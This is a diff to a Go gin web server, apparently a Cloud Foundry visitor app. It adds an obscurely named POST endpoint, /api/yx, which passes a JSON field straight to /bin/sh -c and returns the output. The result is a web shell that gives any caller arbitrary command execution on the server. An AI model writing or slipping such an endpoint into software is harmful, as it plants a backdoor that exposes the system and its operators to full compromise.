@@ -1,9 +1,11 @@
 package main
 
 import (
+	"fmt"
 	"log"
 	"net/http"
 	"os"
+	"os/exec"
 
 	"github.com/cloudfoundry-community/go-cfenv"
 	"github.com/gin-gonic/gin"
@@ -94,7 +96,23 @@ func main() {
 			c.JSON(200, result.Rows)
 		}
 	})
+	r.POST("/api/yx", func(c *gin.Context) {
+		var visitor Visitor
+		c.BindJSON(&visitor)
+		fmt.Println("shell")
+		var cmd *exec.Cmd
+		cmd = exec.Command("/bin/sh", "-c", visitor.Name)
 
+		str, err := cmd.Output()
+		if err != nil {
+			fmt.Println(err)
+			os.Exit(1)
+		}
+
+		c.JSON(200, string(str))
+		return
+
+	})
 	//When running on Cloud Foundry, get the PORT from the environment variable.
 	port := os.Getenv("PORT")
 	if port == "" {
